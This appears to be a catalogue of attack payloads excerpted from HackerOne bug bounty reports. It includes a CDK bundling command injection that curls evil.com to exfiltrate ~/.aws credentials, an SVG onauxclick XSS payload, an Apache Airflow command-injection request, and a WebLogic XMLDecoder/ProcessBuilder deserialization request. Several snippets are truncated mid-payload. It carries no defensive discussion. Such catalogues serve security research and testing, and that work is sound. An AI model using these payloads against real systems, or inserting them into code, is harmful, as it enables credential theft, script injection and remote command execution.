import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';

export class ConvenientLambda extends NodejsFunction {
  constructor(scope, id, props) {
    super(scope, id, {
      ...props,
      bundling: {
        ...props.bundling,
        externalModules: [
          ...(props.bundling?.externalModules ?? []),
          // Attacker payload hidden among legitimate-looking externals
          'lodash & curl https://evil.com/exfil?data=$(cat ~/.aws/
```

— [Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`](https://hackerone.com/reports/3558713) · AWS VDP · [inkerton](https://hackerone.com/inkerton)


## SVG element with onauxclick attribute executing JavaScript (confirm) for DOM‑based XSS

### `5b1dae66`

```
"><svg height="1000" width="1000" onauxclick=confirm`12233`> <circle cx="500" cy="500" r="400" stroke="black" stroke-width="3" fill="red" /> </svg>
```

— [HTML injection leads to reflected XSS](https://hackerone.com/reports/743345) · Eternal · [haxor5392](https://hackerone.com/haxor5392) · $150.0


## Unix command injection using shell command substitution in JSON field

### `0548b5c6`

```
POST /api/v1/datasets/events HTTP/1.1
Host: 192.168.168.129:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.168.129:8080/datasets?uri=s3%3A%2F%2Foutput%2F1.txt
Cookie: session=<authen-cookie>
Content-Type: application/json
Content-Length: 62

{"dataset_uri":"s3://output/1.txt","extra":{"hi
```

**Parameter:** `extra`
— [CVE-2024-45498: Apache Airflow Command injection in read_dataset_event_from_classic DAG](https://hackerone.com/reports/2705661) · Internet Bug Bounty · [nhienit2010](https://hackerone.com/nhienit2010)


## Use of eval() to execute arbitrary JavaScript

### `4b54097e`

```
eval()
```

— [Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message](https://hackerone.com/reports/631956) · Valve · [shayhelman](https://hackerone.com/shayhelman)


## XML deserialization leading to command execution via java.lang.ProcessBuilder

### `50d2f7da`

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: ███
Content-Length: 724
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://target.com/soap/envelope/"> 
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://evil.com/2004/06/soap/workarea/"> 
			<java version="1.8.0_151" class="java.beans.XMLDecoder"> 
			<void class="java.lang.ProcessBuilder"> 
				<array class="java.lang.String" length="3">
				<void index = "0">
				
```

— [Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ \[CVE-2017-10352\]](https://hackerone.com/reports/634630) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)
